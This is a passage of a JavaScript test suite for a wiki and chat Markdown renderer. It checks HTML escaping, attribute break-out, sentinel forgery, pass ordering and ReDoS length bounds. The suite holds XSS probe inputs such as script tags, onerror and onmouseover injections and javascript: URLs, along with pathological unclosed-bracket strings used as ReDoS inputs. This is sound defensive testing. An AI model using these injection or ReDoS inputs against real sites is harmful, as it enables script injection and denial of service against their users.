/**
 * test-next-markdown.js — OFFLINE suite for /next's Markdown renderer.
 *
 * WHY THIS FILE EXISTS
 * --------------------
 * /next's `renderMarkdown` shipped in v3.2.0 with NO test coverage of its own
 * (recorded as a known gap in the v3.7.0 release notes) while the SHIPPING
 * renderer next to it — src/public/markdown.js — has been pinned by
 * scripts/test-chat-markdown.js since v3.0.10. That asymmetry mattered the
 * moment the renderer was LIFTED into src/public/next/shared/markdown.js so
 * the wiki-browse reader could render rich Markdown instead of escaped
 * source: the lift WIDENS the renderer's input surface from "LLM chat
 * answers" to "wiki page bodies", and wiki bodies are LLM-authored AND
 * hand-editable AND arrive over Personal Sync and Shared Brain mirrors from
 * other machines and other people. That is hostile input by construction.
 *
 * This suite was written and made green BEFORE the lift, against the renderer
 * in its original home, and re-run unchanged after it — which is what proves
 * the move was behaviour-preserving rather than merely asserting it.
 *
 * THE CARDINAL RULE THE SUITE GUARDS
 * ----------------------------------
 * Escape the WHOLE string FIRST, then insert only a fixed allow-list of tags
 * by matching Markdown syntax in the ALREADY-ESCAPED text. No model text, no
 * user text, and no wiki-page text is ever interpolated into an attribute or
 * a URL, and the renderer emits no href/src sink at all.
 *
 * TECHNIQUE
 * ---------
 * The subject is an ES module that statically imports `icon` from ../app.js,
 * so it cannot simply be `import`ed here (that would pull the whole /next
 * shell, which needs a DOM). Instead the pure functions are extracted from
 * the real source by BRACE MATCHING and evaluated standalone with a stubbed
 * `icon` — the same technique scripts/test-next-mcp-wizard.js uses, including
 * its loud desync tripwire. A truncated or missing extraction THROWS; it must
 * never degrade into a green suite that silently tested nothing.
 */

import { readFileSync, existsSync, readdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const P_SHARED = path.join(ROOT, 'src/public/next/shared/markdown.js');
const P_CHAT = path.join(ROOT, 'src/public/next/views/chat.js');
const P_DOMAINS = path.join(ROOT, 'src/public/next/views/domains.js');
const P_DOMAINS_CSS = path.join(ROOT, 'src/public/next/views/domains.css');
const P_CHAT_CSS = path.join(ROOT, 'src/public/next/views/chat.css');

let passed = 0, failed = 0;
function ok(cond, label) {
  if (cond) { passed++; console.log(`  ✓ ${label}`); }
  else { failed++; console.log(`  ✗ ${label}`); }
}
function section(t) { console.log(`\n${t}`); }

// ── Comment stripping (for the source-level guards only) ─────────────────
// The subjects here are among the most heavily commented files in the repo,
// and several of those comments QUOTE the exact strings this suite asserts
// absent (`<pre class="dm-page-source">`, the old "must not import another
// view's internals" note). Run against raw text, those guards would be
// reading a comment instead of code — the "the check stopped reaching what
// it protects" failure this repo has recorded more than once.
//
// Deliberately conservative, exactly as in test-next-mcp-wizard.js: remove
// /* … */ blocks and lines whose first non-whitespace characters are //. It
// does NOT strip end-of-line comments — telling those from a // inside a
// string needs a real lexer, and the safe direction for an ABSENCE check is
// to leave too much in (a false FAILURE someone must look at), never too
// little (a false pass). assertStrippedSane() fails loudly on over-reach.
function stripComments(src) {
  return src
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .split('\n')
    .filter((line) => !/^\s*\/\//.test(line))
    .join('\n');
}
function assertStrippedSane(stripped, label, mustContain) {
  for (const needle of mustContain) {
    if (!stripped.includes(needle)) {
      throw new Error(`stripComments over-reached on ${label}: "${needle}" is gone from the stripped code`);
    }
  }
  return stripped;
}

// ── Brace-matched extraction ─────────────────────────────────────────────
// Same shape (and the same reasons) as test-next-mcp-wizard.js's copy: skip
// the parameter list before hunting for the body brace, then match braces,
// then a tripwire so a desynced matcher fails by NAME here rather than as a
// confusing SyntaxError out of new Function().
function extractFunction(src, name, label) {
  const marker = new RegExp(`(?:^|\\n)(?:export\\s+)?(?:async\\s+)?function ${name}\\s*\\(`);
  const m = marker.exec(src);
  if (!m) throw new Error(`extractFunction: "${name}" not found in ${label}`);
  const start = m.index + (m[0].startsWith('\n') ? 1 : 0);

  let p = src.indexOf('(', start);
  if (p === -1) throw new Error(`extractFunction: "${name}" has no parameter list in ${label}`);
  let parenDepth = 0;
  for (; p < src.length; p++) {
    if (src[p] === '(') parenDepth++;
    else if (src[p] === ')') { parenDepth--; if (parenDepth === 0) { p++; break; } }
  }
  let i = src.indexOf('{', p);
  if (i === -1) throw new Error(`extractFunction: "${name}" has no body in ${label}`);
  let depth = 0;
  for (; i < src.length; i++) {
    if (src[i] === '{') depth++;
    else if (src[i] === '}') { depth--; if (depth === 0) { i++; break; } }
  }
  // Drop a leading `export ` — the extraction has to be evaluable inside
  // new Function(), where an export declaration is a hard SyntaxError. The
  // marker above accepts it so this suite reads the same function whether it
  // is a module export (shared/markdown.js) or a file-local declaration.
  const extracted = src.slice(start, i).replace(/^export\s+/, '');
  if (!/\n\}$/.test(extracted)) {
    throw new Error(`extractFunction: "${name}" in ${label} does not end at a top-level closing brace — the matcher desynced`);
  }
  return extracted;
}

// ── Locate the ONE module that declares the renderer ──────────────────────
// This is a real guard, not plumbing. The whole point of lifting the renderer
// into next/shared/ is that there is exactly ONE copy: two hand-maintained
// copies of an escape-first guard is the shape that produced the v3.2.0
// CRITICAL, and this repo already pins duplicated frontend helpers with a
// byte-identity drift suite (test-next-ingest-logic-drift.js) because that
// duplication rots. If a second declaration ever reappears — a view
// "temporarily" inlining its own copy — this goes RED before the copies can
// drift apart.
//
// ── IT ENUMERATES THE TREE. IT USED NOT TO, AND THAT WAS THE BUG ──────────
// The first version of this guard tested a HARDCODED THREE-PATH LIST
// (shared/markdown.js, views/chat.js, views/domains.js). An adversarial audit
// appended a non-escape-first `export function renderMarkdown` to
// views/ingest.js and this suite stayed 129 passed / 0 failed, §0 still
// printing "exactly ONE … (found 1)". The comment right here claimed the
// opposite ("a view 'temporarily' inlining its own copy → RED"), and so did
// views/domains.js's import note ("§0 fails on a second declaration anywhere
// in /next"). Both were false.
//
// That is this repo's named failure shape twice over — a guard applied to an
// INSTANCE (three known files) rather than to the CLASS (every module in
// /next), wearing a docblock that overclaims the class. It mattered more than
// its size suggests: "there is exactly one copy" is the ENTIRE justification
// for lifting the renderer out of chat.js, so the guard protecting that
// rationale was blind to precisely the regression it exists to catch.
//
// Now it walks src/public/next/** mechanically — the same shape as the
// POST /api/domains call-site walk in test-next-chat-compile.js, and for the
// same reason: a hand-maintained inventory of "the files that could possibly
// contain this" is exactly what goes stale. Forms accepted: plain, exported,
// `export default`, and async function declarations, plus const/let/var
// function expressions and arrows — because a regression pasted back as
// `const renderMarkdown = (raw) => {…}` is the same defect and a
// `function`-only regex would wave it through. (`export default` is not
// hypothetical: it is this codebase's own idiom, used 13× in src/routes/.)
// A mutation proof at the end of this section confirms the detector fires on
// a fourth declarer.
//
// NOT ENFORCED — stated because the previous version of this guard claimed a
// reach it did not have, which is the whole reason it was rewritten. This is
// NAME-scoped, not algorithm-scoped. It does NOT catch: a copy under another
// name (`renderPageBody`), a class method, an object property, a `globalThis`
// assignment, or an aliased re-export (`export { renderMd as renderMarkdown }`).
// It walks `.js` only (no `.mjs` exist in the tree today). It therefore proves
// "exactly one thing NAMED renderMarkdown", NOT "exactly one copy of this
// algorithm" — the stronger claim the lift's rationale rests on.
const NEXT_DIR = path.join(ROOT, 'src/public/next');
function listNextJs(dir) {
  const out = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, entry.name);
    if (entry.isDirectory()) out.push(...listNextJs(p));
    else if (entry.name.endsWith('.js')) out.push(p);
  }
  return out;
}
// Comment-stripped: several files in /next DISCUSS `renderMarkdown` at length
// (this very concern is documented in shared/markdown.js's header and in
// domains.js's import note). Reading raw text would count a comment as a
// declaration — a false RED, which is the safe direction, but a noisy and
// misleading one. Note stripComments leaves END-OF-LINE comments in, so the
// residual error direction stays false-RED, never false-green.
//
// Deliberately NOT matched: `import { renderMarkdown } from …` and any call
// `renderMarkdown(` — those are the healthy shape this guard exists to allow.
const DECL_RE = /(?:^|\n)\s*(?:export\s+)?(?:default\s+)?(?:(?:async\s+)?function\s+renderMarkdown\s*\(|(?:const|let|var)\s+renderMarkdown\s*=)/;
function declaresRenderMarkdown(src) { return DECL_RE.test(stripComments(src)); }

const NEXT_JS_FILES = existsSync(NEXT_DIR) ? listNextJs(NEXT_DIR) : [];
const found = NEXT_JS_FILES
  .map((p) => ({ p, label: path.relative(ROOT, p), src: readFileSync(p, 'utf8') }))
  .filter((c) => declaresRenderMarkdown(c.src));

section('0. Single source of truth');
ok(NEXT_JS_FILES.length >= 8,
  `the walk actually reaches the /next tree (${NEXT_JS_FILES.length} .js files scanned, not a hardcoded list)`);
ok(found.length === 1,
  `exactly ONE /next module declares renderMarkdown (found ${found.length}: ${found.map((f) => f.label).join(', ') || 'none'})`);
if (found.length !== 1) {
  console.log(`\n${'─'.repeat(60)}`);
  console.log(`Passed: ${passed}   Failed: ${failed}`);
  console.log('❌ FAILURES — cannot load the renderer; aborting before the behaviour battery');
  process.exit(1);
}
const HOME = found[0];
console.log(`  · renderer home: ${HOME.label}`);

// ── Mutation proof: a fourth declarer in ANY /next module is detected ─────
// Without this, the assertion above is one hardcoded list away from being
// decorative again — which is exactly how it shipped the first time. The
// mutation is done on COPIES held in memory (this suite never writes to
// disk), reproducing the shape an audit actually used to defeat the old
// guard: a second `export function renderMarkdown` appended to a view that
// was not on the list. Every declaration FORM is exercised, because a
// detector that only knows `function` is the same instance-scoped mistake in
// miniature.
{
  const victim = NEXT_JS_FILES.find((p) => p !== HOME.p && /views[/\\]/.test(p));
  ok(!!victim, 'a non-home /next view exists to mutate (the detector has something to be tested against)');
  const clean = victim ? readFileSync(victim, 'utf8') : '';
  ok(victim ? !declaresRenderMarkdown(clean) : false,
    `control: the unmutated ${victim ? path.relative(ROOT, victim) : '?'} does NOT declare renderMarkdown`);

  const FORMS = {
    'plain function': '\nfunction renderMarkdown(raw) { return String(raw); }\n',
    'exported function': '\nexport function renderMarkdown(raw) { return String(raw); }\n',
    'async function': '\nasync function renderMarkdown(raw) { return String(raw); }\n',
    'const arrow': '\nconst renderMarkdown = (raw) => String(raw);\n',
    'exported const': '\nexport const renderMarkdown = function (raw) { return String(raw); };\n',
    'let function expression': '\nlet renderMarkdown = function (raw) { return String(raw); };\n',
  };
  for (const [form, snippet] of Object.entries(FORMS)) {
    ok(declaresRenderMarkdown(clean + snippet),
      `CONFIRMED RED (${form}): a second declarer appended to a copy of ${path.relative(ROOT, victim)} IS detected`);
  }
  // And the healthy shapes must NOT trip it, or the guard becomes a tax that
  // the next person disables rather than a signal.
  ok(!declaresRenderMarkdown(clean + "\nimport { renderMarkdown } from '../shared/markdown.js';\n"),
    'importing renderMarkdown is NOT counted as declaring it');
  ok(!declaresRenderMarkdown(clean + '\nconst html = renderMarkdown(page.body);\n'),
    'calling renderMarkdown is NOT counted as declaring it');
}

// ── Build the sandbox ─────────────────────────────────────────────────────
// `icon` is the only thing the renderer closes over from the shell. The stub
// is deliberately marked (`data-icon`) so an assertion can tell "the citation
// chip carries its dot icon" from "some other svg happened to be there".
const FNS = ['escHtml', 'formatSegment', 'renderInline', 'renderMarkdown'];
const bodySrc = FNS.map((n) => extractFunction(HOME.src, n, HOME.label)).join('\n\n');
const iconCalls = [];
const iconStub = (name, size) => {
  iconCalls.push([name, size]);
  return '<svg data-icon="' + name + '" width="' + (size || 19) + '"></svg>';
};
const sandbox = new Function('icon', `${bodySrc}\nreturn { ${FNS.join(', ')} };`)(iconStub);
const { renderMarkdown, escHtml } = sandbox;

// A helper for the recurring "did any LIVE markup form?" question. Live markup
// means: a real tag we did not put on the allow-list, or ANY event-handler /
// URL attribute at all.
const ALLOWED_TAGS = new Set(['p', 'br', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'div', 'span', 'svg']);
function foreignTags(html) {
  const out = [];
  const re = /<\/?([a-zA-Z][a-zA-Z0-9-]*)\b/g;
  let m;
  while ((m = re.exec(html))) if (!ALLOWED_TAGS.has(m[1].toLowerCase())) out.push(m[1]);
  return out;
}
// IMPORTANT — this deliberately inspects only REAL tags, and the reason is the
// whole point of the renderer. Because every `<` in the input was escaped to
// `&lt;` before any pass ran, the only unescaped `<` left in the output is one
// the renderer itself wrote. So `/<[^>]*>/` enumerates exactly the renderer's
// own markup, and an attribute is "live" only if it sits inside one of those.
// A naive scan of the WHOLE string is wrong and was caught red-handed while
// writing this suite: the escaped TEXT `&lt;img src=x onerror=alert(2)&gt;`
// contains the character run " src=" and " onerror=", so a whole-string regex
// reported an attribute break-out on output that is provably inert. That
// direction of error is the dangerous one to leave in — it trains the next
// reader to ignore this assertion.
function realTags(html) { return String(html).match(/<[^>]*>/g) || []; }
function hasLiveHandlerOrUrlAttr(html) {
  return realTags(html).some((t) =>
    /\son[a-z]+\s*=/i.test(t) || /\s(?:href|src|xlink:href|formaction|style)\s*=/i.test(t));
}

// ══ 1. XSS — the whole point ═════════════════════════════════════════════
section('1. XSS — raw HTML in the input never becomes live markup');
{
  const evil = 'Hi <script>alert(1)</script> and <img src=x onerror=alert(2)> and <svg/onload=alert(3)>';
  const h = renderMarkdown(evil);
  ok(!/<script/i.test(h), 'no live <script> tag');
  ok(!/<img/i.test(h), 'no live <img> tag');
  ok(!/<svg\/|<svg /i.test(h.replace(/<svg data-icon="[^"]*" width="\d+"><\/svg>/g, '')),
    'no live <svg> tag from input (only the renderer\'s own icon markup)');
  ok(/&lt;script&gt;/.test(h), 'the script text survives as escaped entities');
  ok(!hasLiveHandlerOrUrlAttr(h), 'no on*= / href= / src= / style= attribute anywhere in the output');
  ok(foreignTags(h).length === 0, `no tag outside the allow-list (saw: ${foreignTags(h).join(',') || 'none'})`);
}
{
  // Every one of the five escaped characters, individually and together.
  ok(escHtml('&') === '&amp;', 'escHtml: &');
  ok(escHtml('<') === '&lt;', 'escHtml: <');
  ok(escHtml('>') === '&gt;', 'escHtml: >');
  ok(escHtml('"') === '&quot;', 'escHtml: "');
  ok(escHtml("'") === '&#39;', "escHtml: '");
  ok(escHtml('&<>"\'') === '&amp;&lt;&gt;&quot;&#39;', 'escHtml: all five, ampersand first (no double-escape order bug)');
}
{
  // Markdown emphasis must not become a hole: the inner HTML stays escaped.
  const h = renderMarkdown('**<b>bold</b>** and *<i>it</i>*');
  ok(h.includes('<strong>') && h.includes('&lt;b&gt;'), 'bold applied, inner HTML still escaped');
  ok(!/<b>|<i>/.test(h), 'no live <b>/<i> from the input');
}

// ══ 2. Attribute break-out through EVERY interpolation point ═════════════
// The renderer has exactly four places where input text lands inside markup
// it emits: a wikilink target, a wikilink alias, a citation path, and an
// inline code span. Each is attacked here with the same battery.
section('2. Attribute break-out — every interpolation point');
{
  const vectors = [
    ['wikilink target', '[[a" onmouseover="alert(1)]]'],
    ['wikilink alias', '[[x|y" onmouseover="alert(1)]]'],
    ['citation path', '[source: b" onclick="alert(1)]'],
    ['inline code', '`c" onclick="alert(1)`'],
    ['heading', '# h" onclick="alert(1)'],
    ['list item', '- li" onclick="alert(1)'],
    ['fenced code', '```\nx" onclick="alert(1)\n```'],
    ['mixed', '[[a]] [source: b] `c` **d** <img src=x onerror=y>'],
  ];
  for (const [label, input] of vectors) {
    const h = renderMarkdown(input);
    ok(!hasLiveHandlerOrUrlAttr(h), `${label}: no live handler/URL attribute forms`);
    ok(foreignTags(h).length === 0, `${label}: no foreign tag`);
    ok(!realTags(h).some((t) => /\son[a-z]+=(?:"[^"]*"|'[^']*'|[^\s>]+)/i.test(t)),
      `${label}: no on*= in any quoting form, inside any emitted tag`);
    // The quotes the attack supplied must still be visible as escaped
    // entities — proof the payload was neutralised rather than stripped.
    if (input.includes('"')) ok(h.includes('&quot;'), `${label}: the injected quote survives as &quot;`);
  }
}
{
  // javascript: URLs have no sink to reach — assert that stays true.
  const h = renderMarkdown('[[javascript:alert(1)]] and [source: javascript:alert(1)] and `javascript:alert(1)`');
  ok(!/href|src/i.test(h), 'javascript: text reaches no href/src (the renderer emits none)');
  ok(h.includes('javascript:alert(1)'), 'the text is still shown to the reader, inert');
}
{
  // The renderer's OWN emitted markup is the only markup in the output, and
  // every attribute in it is a literal the renderer wrote. Enumerate them.
  const h = renderMarkdown('# H\n\n[[a|b]] [source: p.md] `c`\n\n- one\n\n1. two\n\n```\nfenced\n```');
  const attrs = realTags(h).flatMap((t) => [...t.matchAll(/\s([a-zA-Z:-]+)=/g)].map((m) => m[1]));
  const unexpected = attrs.filter((a) => !['class', 'data-icon', 'width'].includes(a));
  ok(unexpected.length === 0, `only literal class/icon attributes are emitted (saw extra: ${unexpected.join(',') || 'none'})`);
}

// ══ 3. Sentinel forgery (the v3.0.10 class) ═══════════════════════════════
// v3.0.10 shipped a forgeable ` CODEn ` text placeholder in the SHIPPING
// renderer: an answer containing the literal token got corrupted. The fix was
// a STRUCTURAL split on the code-span syntax instead of a text sentinel.
// /next inherited the structural form; assert it, and assert no other
// placeholder-shaped token can be forged either.
section('3. Sentinel forgery — no text placeholder to forge');
{
  // Case-SENSITIVE on purpose: the v3.0.10 sentinel was the uppercase token
  // ` CODE0 `. An /i scan here matches the perfectly legitimate `<code>` tag
  // the renderer emits and reports a defect that does not exist — caught while
  // writing this suite.
  ok(!/\bCODE\d|__CODE|PLACEHOLDER|SENTINEL/.test(bodySrc),
    'the renderer source carries no uppercase text-sentinel/placeholder token');
  ok(bodySrc.includes('.split(/(`[^`\\n]+`)/g)'),
    'inline code is isolated by a STRUCTURAL split on the code-span syntax, not a sentinel');
  const h1 = renderMarkdown('A literal CODE0 token and a ' + String.fromCharCode(0) + ' NUL.');
  ok(h1.includes('CODE0'), 'literal CODE0 stays literal');
  ok(!/undefined/.test(h1), 'no undefined leaks from a forged placeholder');
  const h2 = renderMarkdown('Here is `real` and also a fake CODE0 token.');
  ok(/<code>real<\/code>/.test(h2) && h2.includes('CODE0'), 'a real code span renders AND the literal stays literal');
  // Code-span contents must NOT be re-formatted (that is what the structural
  // split buys): markdown syntax inside backticks stays inert text.
  const h3 = renderMarkdown('`**not bold** and [[not a link]]`');
  ok(!/<strong>/.test(h3), 'markdown inside a code span is not re-formatted (bold)');
  ok(!/chat-wikilink/.test(h3), 'markdown inside a code span is not re-formatted (wikilink)');
}

// ══ 4. Pass ORDERING invariant (the M1/M3 regression guards) ═════════════
// The citation pass MUST run last in formatSegment. Both adversarial vectors
// recorded in the source's own comments are replayed here so a reorder fails
// behaviourally, not just as a diff someone has to notice.
section('4. Pass ordering — citation stays last');
{
  const m1 = renderMarkdown('[source: x[[y] tail]] rest of the document');
  ok(!hasLiveHandlerOrUrlAttr(m1), 'M1 vector: no live attribute');
  ok((m1.match(/<span/g) || []).length === (m1.match(/<\/span>/g) || []).length,
    'M1 vector: every emitted <span> is closed (no consumed closing tag)');
  ok(m1.includes('rest of the document'), 'M1 vector: no span of the document is deleted');

  const m3 = renderMarkdown('[source: [[a]] onerror=alert(1) ]');
  ok(!/data-cite=/.test(m3), 'M3 vector: the citation path is NOT placed in an attribute');
  ok(/chat-cite-path/.test(m3), 'M3 vector: the path lives in a dedicated text-content span');
  ok(!hasLiveHandlerOrUrlAttr(m3), 'M3 vector: no live attribute forms');
  ok((m3.match(/<span/g) || []).length === (m3.match(/<\/span>/g) || []).length, 'M3 vector: spans balanced');

  // ── The EMPHASIS side of the same class (audit finding, LOW) ────────────
  // The two vectors above are both CITATION-side. The identical hazard
  // exists on the emphasis passes, which run over markup the WIKILINK pass
  // already emitted: `[[a**b]]**` yields
  //   <span class="chat-wikilink">a<strong>b</span></strong>
  // — the `<strong>` opened inside the span and closed outside it, so the
  // span's closing tag is consumed into the wrong element.
  //
  // KNOWN AND BENIGN, RECORDED RATHER THAN "FIXED": verified against a real
  // HTML parser, the browser repairs this to correct nesting with text
  // "ab", no attribute is reachable (neither tag carries one beyond the
  // fixed class), and the escape-first rule means nothing here came from
  // unescaped input. Changing the pass order or the emphasis regexes to
  // avoid it would alter renderer output and needs its own evidence — the
  // move that created this module is proven safe precisely BY its output
  // being byte-identical. What was actually wrong is that §4 replayed only
  // the citation vectors, leaving this arm with no vector at all.
  //
  // SCOPE, honestly: these four assertions pin the CURRENT output shape
  // (balanced span counts, balanced emphasis counts, no foreign tag, no live
  // attribute). They do NOT detect a pass REORDER — a re-audit tried two
  // (citation-first, and emphasis-before-wikilink) and both produced output
  // BYTE-IDENTICAL to unmutated here, so the reorder scenario an earlier
  // draft of this comment claimed to cover is not in fact covered. What they
  // would catch is a change to the emphasis or wikilink REGEXES that
  // unbalances the tags. Left as-is rather than widened: the reorder case is
  // already pinned by §4's M1 citation vectors, which DO go red on it.
  for (const [vec, label] of [['[[a**b]]**', 'bold'], ['[[a_b]]_', 'underscore-emphasis']]) {
    const e = renderMarkdown(vec);
    ok((e.match(/<span/g) || []).length === (e.match(/<\/span>/g) || []).length,
      `emphasis vector (${label}): <span> open/close counts stay balanced`);
    ok(!hasLiveHandlerOrUrlAttr(e), `emphasis vector (${label}): no live attribute forms`);
    ok(foreignTags(e).length === 0, `emphasis vector (${label}): no tag outside the allow-list`);
    ok((e.match(/<strong>|<em>/g) || []).length === (e.match(/<\/strong>|<\/em>/g) || []).length,
      `emphasis vector (${label}): emphasis tags are themselves balanced (mis-NESTED, never mis-COUNTED)`);
  }
}

// ══ 4b. ReDoS — the two wiki-token passes are LENGTH-BOUNDED ═════════════
// Found by adversarial audit. `\[\[([^\]|]+)…\]\]` and `\[source:([^\]]+)\]`
// are QUADRATIC on unclosed brackets: every `[[` sends the greedy class to
// end-of-input hunting a `]]` that never arrives, then backtracks all the
// way. Measured on this module BEFORE the bound → AFTER it:
//     '[['.repeat(8000)   ( 16 KB)   1,367 ms  →   15 ms
//     '[['.repeat(32000)  ( 64 KB)  19,194 ms  →   63 ms   (307×)
//     '[source:'x32000    (256 KB)   3,399 ms  →   32 ms
//     '[source:'x128000   (  1 MB)  69,422 ms  →  127 ms   (547×)
//     benign prose         (  1 MB)       2 ms →    2 ms   (unchanged)
// Before: 4× input → 14–20× time (quadratic). After: 4× input → ~4× time.
//
// The algorithm is shared with the SHIPPING src/public/markdown.js and is not
// a finding there — that renderer only sees the user's own chat answers. It
// became one here when the lift widened this renderer's input to WIKI PAGE
// BODIES, which arrive over Personal Sync and Shared Brain mirrors from other
// people's machines. renderMarkdown runs synchronously into innerHTML, so a
// single hostile mirrored page froze the victim's tab for a minute or more.
//
// Numbered 4b rather than renumbered into the middle: §5–§9 are referenced by
// name in the module's own comments, and churning them to insert a section is
// how cross-references rot.
section('4b. ReDoS — the wiki-token passes carry a measured length bound');
{
  // ── Structural: no unbounded quantifier survives, and the bound is ONE
  // number in all three places. This is the deterministic half; the timing
  // assertions below are the behavioural backup.
  const src = HOME.src;
  const wikiRe = /t\.replace\(\/\\\[\\\[\(\[\^\\\]\|\]\{1,(\d+)\}\)\(\?:\\\|\(\[\^\\\]\]\{1,(\d+)\}\)\)\?\\\]\\\]\/g/.exec(src);
  const citeRe = /t\.replace\(\/\\\[source:\(\[\^\\\]\]\{1,(\d+)\}\)\\\]\/g/.exec(src);
  ok(!!wikiRe, 'the wikilink pass uses {1,N} on BOTH capture groups (target and alias), not +');
  ok(!!citeRe, 'the citation pass uses {1,N} on its capture group, not +');
  const bounds = [wikiRe && wikiRe[1], wikiRe && wikiRe[2], citeRe && citeRe[1]].map(Number);
  // `> 0`, not `Number.isFinite`: a non-matching regex above yields
  // Number(null) === 0, so an isFinite test made this assertion pass
  // VACUOUSLY on the very mutation it accompanies (caught by running that
  // mutation — [0,0,0] are all "equal"). The two ok(!!…) checks above still
  // went red, so nothing was missed, but a vacuous green next to a real red
  // is how a guard starts being ignored.
  ok(bounds.every((b) => b === bounds[0]) && bounds[0] > 0,
    `all three bounds are the SAME positive number (got ${JSON.stringify(bounds)}) — one value cannot drift against another`);
  // THE FLOOR IS MEASURED, NOT GUESSED. Real corpus: 5,221 wiki pages /
  // 36,910 wikilinks / 53 conversations. Longest real wikilink TARGET 241,
  // longest real ALIAS 40, longest real [source:] path 205 (an LLM emitted
  // two comma-joined summary paths inside one citation). The intuitive
  // "round" bound of 200 would have silently broken a real link in the
  // maintainer's own wiki AND a real citation in his own chat history. Do
  // not lower this without re-measuring the corpus.
  ok(bounds[0] >= 300,
    `the bound (${bounds[0]}) clears the longest token measured in the real corpus (241) with headroom`);
  ok(bounds[0] <= 4096, `the bound (${bounds[0]}) is small enough to keep the pass linear in page size`);

  // ── Behavioural regression guard for the floor. If someone later "tidies"
  // the bound down to a rounder number, THESE go red with a concrete symptom
  // rather than the change landing silently and breaking real pages.
  const longTarget = 'x'.repeat(241);
  const rLong = renderMarkdown('[[' + longTarget + ']]');
  ok(/class="chat-wikilink"/.test(rLong),
    'a 241-character wikilink target (the longest in the real wiki) still renders AS a wikilink');
  ok(rLong.includes(longTarget), 'and its full label survives — nothing is truncated');
  const rAlias = renderMarkdown('[[t|' + 'a'.repeat(40) + ']]');
  ok(/class="chat-wikilink"/.test(rAlias), 'a 40-character alias (the longest in the real wiki) still renders');
  const longPath = 'summaries/' + 'p'.repeat(195);
  const rCite = renderMarkdown('[source: ' + longPath + ']');
  ok(/class="chat-citation-tag"/.test(rCite),
    'a 205-character citation path (the longest in real conversations) still renders AS a chip');
  ok(rCite.includes(longPath), 'and its full path survives for the click handler to read back');

  // ── Degradation above the bound is SAFE: literal text, never half-markup.
  const over = renderMarkdown('[[' + 'x'.repeat(bounds[0] + 1) + ']]');
  ok(!/chat-wikilink/.test(over), 'a token longer than the bound does NOT render as a wikilink');
  ok((over.match(/<span/g) || []).length === (over.match(/<\/span>/g) || []).length,
    'and produces no unbalanced span — it degrades to literal text, not partial markup');
  ok(foreignTags(over).length === 0 && !hasLiveHandlerOrUrlAttr(over),
    'over-bound input emits no foreign tag and no live attribute');

  // ── Timing: ABSOLUTE CEILINGS ONLY, deliberately.
  //
  // An earlier version of this block also asserted the SCALING RATIO
  // (tLarge/tSmall < 8) on the theory that a ratio is machine-independent
  // because a slow box shifts both samples together. THAT THEORY IS WRONG
  // AND WAS MEASURED WRONG: each sample is a single wall-clock reading, so
  // under CPU contention either one can be descheduled independently. On
  // provably LINEAR code the observed ratio ranged 0.3 to 35.9 — a ~120×
  // spread, with values below 1 meaning the small input measured SLOWER than
  // the large one. Failure rate: 0% idle, 0% at 2x core oversubscription,
  // 73% at ~5x. GitHub's 2-core shared runners sit in that band.
  //
  // It was removed rather than loosened, because a metric spanning 0.3–35.9
  // has no threshold that both never flakes and still detects a regression.
  // The clincher was its FAILURE TEXT: it read "4x input -> 25.2x time
  // (quadratic measured 14-20x)", i.e. it told a CI reader the ReDoS fix had
  // REGRESSED when it had not. A guard that cries wolf about a main-thread
  // freeze is worse than no guard — it teaches people to ignore the one
  // assertion protecting it.
  //
  // The ceilings below are what actually carry the guarantee, and they are
  // robust: at load average 82 the worst observed was 337 ms against 1500.
  // Reverting the three quantifiers to `+` still fails tLarge in ~1.9 s.
  // Detection is preserved; the false-alarm surface is not.
  const timeMs = (s) => { const t0 = process.hrtime.bigint(); renderMarkdown(s); return Number(process.hrtime.bigint() - t0) / 1e6; };
  const tLarge = timeMs('[['.repeat(16000));   // 32 KB
  ok(tLarge < 1500, `32 KB of unclosed wikilinks renders in ${tLarge.toFixed(0)} ms (unbounded: ~469 ms at this size, quadratic beyond)`);

  const cLarge = timeMs('[source:'.repeat(32000));  // 256 KB
  ok(cLarge < 1500, `256 KB of unclosed citations renders in ${cLarge.toFixed(0)} ms (unbounded: ~4,222 ms)`);

  // The real corpus's LARGEST page is 314,971 bytes. A page that size made
  // entirely of the pathological shape must still be interactive, or the
  // bound would just have moved the freeze rather than removed it.
  const tRealMax = timeMs('[['.repeat(157500)); // 315 KB, all unclosed
  ok(tRealMax < 6000,   // 6000 not 3000: reached 2107 ms (70% of a 3000 cap) at load avg 82
    `a 315 KB page (the real corpus maximum) of pure unclosed wikilinks renders in ${tRealMax.toFixed(0)} ms`);

  // Benign content must not have paid for any of this.
  const tBenign = timeMs('word '.repeat(60000)); // 300 KB of ordinary prose
  ok(tBenign < 500, `300 KB of ordinary prose still renders in ${tBenign.toFixed(0)} ms (unchanged by the bound)`);
}

// ══ 5. Block formatting ══════════════════════════════════════════════════
section('5. Block formatting');
{
  const h = renderMarkdown('### A heading\n\nSome text.');
  ok(/<div class="chat-md-h">A heading<\/div>/.test(h), 'ATX heading → styled heading div');
  ok(/<p>Some text\.<\/p>/.test(h), 'paragraph wrapped in <p>');

  ok(/<ul><li>one<\/li><li>two<\/li><\/ul>/.test(renderMarkdown('- one\n- two')), 'dash bullets → <ul>');
  ok(/<ul><li>a<\/li><\/ul>/.test(renderMarkdown('* a')), 'star bullet → <ul>');
  ok(/<ul><li>a<\/li><\/ul>/.test(renderMarkdown('+ a')), 'plus bullet → <ul>');
  ok(/<ol><li>one<\/li><li>two<\/li><\/ol>/.test(renderMarkdown('1. one\n2. two')), 'numbered → <ol>');

  const mixed = renderMarkdown('- a\n1. b');
  ok(/<ul>.*<\/ul><ol>.*<\/ol>/.test(mixed), 'switching list type closes the previous list');

  const fence = renderMarkdown('before\n\n```js\nconst x = 1;\n```\n\nafter');
  ok(/<pre><code>const x = 1;<\/code><\/pre>/.test(fence), 'fenced block → <pre><code>');
  ok(fence.includes('<p>before</p>') && fence.includes('<p>after</p>'), 'text around a fence stays paragraphs');
  ok(!fence.includes('```'), 'the fence markers are consumed');

  const unclosed = renderMarkdown('```\nstill open');
  ok(/<pre><code>still open<\/code><\/pre>/.test(unclosed), 'an unterminated fence still flushes (no content lost)');

  const multiline = renderMarkdown('line one\nline two');
  ok(/<p>line one<br>line two<\/p>/.test(multiline), 'soft line break → <br> inside one paragraph');
}

// ══ 6. Inline formatting + wiki tokens ═══════════════════════════════════
section('6. Inline formatting, wikilinks, citations');
{
